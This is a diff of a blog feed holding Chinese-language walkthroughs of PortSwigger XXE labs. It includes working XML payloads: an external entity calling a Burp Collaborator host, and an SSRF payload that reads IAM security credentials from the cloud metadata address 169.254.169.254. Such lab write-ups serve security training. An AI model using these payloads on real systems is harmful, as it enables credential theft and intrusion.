+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>服务器返回报错，但是没有将&lt;code>a&lt;/code>返回，使用Burp Collaborator产生Collaborator server&lt;code>705wp8vwvplxq5ryqnidkhqho8uzip6e.oastify.com&lt;/code>&lt;/li>
+&lt;li>构造以下请求体(定义外部实体&lt;code>xxe&lt;/code>，并使用关键字&lt;code>SYSTEM&lt;/code>发送请求至指定url，最后将结果输出在&lt;code>productId&lt;/code>标签)，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!DOCTYPE root [
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://705wp8vwvplxq5ryqnidkhqho8uzip6e.oastify.com&amp;#34;&amp;gt; ]&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>Lab: Exploiting XXE to perform SSRF attacks</title><link>/portswigger-posts/xxe-lab-exploiting-xxe-to-perform-ssrf/</link><pubDate>Sat, 04 Jan 2025 00:24:30 +0800</pubDate><guid>/portswigger-posts/xxe-lab-exploiting-xxe-to-perform-ssrf/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: a&amp;#34; 服务器将a返回，判断包含XXE注入，构造以下请求体(定义外部实体xxe，并使用关键字SYSTEM发送请求至指定url，最后将结果输出在productId标签)，发送请求后即可解题 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE test [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: { &amp;#34;Code&amp;#34; : &amp;#34;Success&amp;#34;, ... }&amp;#34;</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-exploiting-xxe-to-perform-ssrf-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
@@ -26,6 +308,7 @@
 &lt;li>服务器将&lt;code>a&lt;/code>返回，判断包含XXE注入，构造以下请求体(定义外部实体&lt;code>xxe&lt;/code>，并使用关键字&lt;code>SYSTEM&lt;/code>发送请求至指定url，最后将结果输出在&lt;code>productId&lt;/code>标签)，发送请求后即可解题
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!DOCTYPE test [
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&amp;#34;&amp;gt; ]&amp;gt;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
